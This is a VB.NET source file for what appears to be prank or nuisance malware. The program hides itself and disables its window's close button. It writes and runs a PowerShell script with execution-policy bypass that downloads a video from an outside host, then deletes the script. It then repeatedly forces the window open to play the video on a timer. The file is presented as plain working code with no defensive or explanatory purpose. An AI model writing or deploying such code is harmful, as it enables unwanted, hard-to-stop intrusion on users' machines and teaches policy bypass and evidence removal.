Imports AxWMPLib
Imports WMPLib
Imports System.Timers
Imports System.Net

Public Class Form1
    Private Const CP_NOCLOSE_BUTTON As Integer = &H200
    Protected Overloads Overrides ReadOnly Property CreateParams() As CreateParams
        Get
            Dim myCp As CreateParams = MyBase.CreateParams
            myCp.ClassStyle = myCp.ClassStyle Or CP_NOCLOSE_BUTTON
            Return myCp
        End Get
    End Property
    Private Sub AxWindowsMediaPlayer1_Enter(sender As Object, e As EventArgs) Handles player.Enter

    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        If System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\interval.txt") Then

        Else
            Dim intervalFile As System.IO.StreamWriter
            intervalFile = My.Computer.FileSystem.OpenTextFileWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\interval.txt", True)
            intervalFile.Write("300000")
            intervalFile.Close()
        End If
        Dim fileReader As String
        fileReader = My.Computer.FileSystem.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\interval.txt")
        Timer1.Interval = 7200
        If System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\natasha.wmv") Then

        Else
            Dim file As System.IO.StreamWriter
            file = My.Computer.FileSystem.OpenTextFileWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\dl.ps1", True)
            file.Write("Invoke-WebRequest -Uri ""http://noxyntious.xyz/natasha.wmv"" -OutFile ""$env:APPDATA\natasha.wmv""")
            file.Close()
            Dim psi As New ProcessStartInfo("powershell.exe", "-noprofile -ExecutionPolicy Bypass -file " + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\dl.ps1")
            Dim p As New Process
            p.StartInfo = psi
            p.Start()
            p.WaitForExit()
            My.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\dl.ps1")
        End If
        Threading.Thread.Sleep(10000)
        Timer1.Start()
        player.URL = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\natasha.wmv"
        player.Ctlcontrols.play()
        Timer2.Interval = Convert.ToInt32(fileReader)

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Timer1.Stop()
        Timer2.Start()
        Me.Hide()
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Me.Show()
        Timer2.Stop()
        Timer1.Start()
        player.URL = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\natasha.wmv"
        player.Ctlcontrols.play()
    End Sub
End Class
